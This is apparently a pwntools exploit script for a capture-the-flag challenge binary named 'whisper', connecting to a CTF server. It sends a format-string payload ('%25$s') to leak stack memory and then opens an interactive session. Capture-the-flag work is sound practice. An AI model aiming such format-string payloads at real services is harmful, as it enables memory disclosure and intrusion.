from pwn import *

context.arch = 'amd64'
context.endian = 'little'
context.os = 'linux'
context.terminal = ['konsole', '-e']
context.log_level = 'debug'

e = ELF("./whisper")
# p : process = gdb.debug("./whisper", gdbscript='''
# break *main+351
# break *main+0x22c
# continue
# ''')
p = remote('chal.24.cuhkctf.org', 24018)

p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Whisper something:\n', b'%25$s')
p.sendlineafter(b'Enter your choice: ', b'1')
p.sendlineafter(b'Pick a whisper: ', b'1')


p.interactive()
